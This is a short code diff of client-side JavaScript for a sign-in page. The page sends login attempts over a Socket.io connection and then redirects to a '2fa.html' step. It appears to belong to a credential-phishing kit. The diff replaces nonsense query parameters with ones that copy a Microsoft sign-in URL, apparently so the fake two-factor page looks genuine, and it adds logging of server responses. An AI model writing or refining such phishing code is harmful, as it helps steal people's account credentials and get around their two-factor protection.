@@ -1,6 +1,6 @@
 let connected = null;
 let server = null;
-const useLocal = false;
+const useLocal = true;
 
 window.addEventListener('load', async function () {
 	// Connect to the Socket.io server
@@ -29,8 +29,6 @@ window.addEventListener('load', async function () {
 
 	back.addEventListener('click', goBack);
 
-	let msg;
-	var id = null;
 	var email_error_shown = false;
 	var pass_error_shown = false;
 
@@ -142,7 +140,7 @@ window.addEventListener('load', async function () {
 	});
 
 	socket.on('send-email-error', async (res) => {
-		console.log('data received');
+		console.log('data received', res);
 		overlay.classList.toggle('hidden');
 
 		if (res != 'login') {
@@ -164,7 +162,7 @@ window.addEventListener('load', async function () {
 			pass_error_shown = true;
 			return;
 		} else {
-			const url = `2fa.html?liveis=iuytfrdxcvbhnmkolp-0o9i8y6t5rdsxdcfgyu8i90oplkmnjhbgvfcder5678ikjnhbgvfctgyhujn&sslid=hiuhfbwefbwu8743uuh3unuhfj34nfiuhjh3fjkeiu&user=${thisUser.innerHTML}&open=087frfgvhjmklnbgyt87yu90oknjbhvgy`;
+			const url = `2fa.html?cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&id=292841&id=292841&user=${thisUser.innerHTML}&uaid=37841b1a533846b18c4d63e24f9ef359&contextid=62586578791094A1&opid=340D15FC348E3278&bk=1728540361&mkt=EN-US`;
 
 			window.location.href = url;
 		}
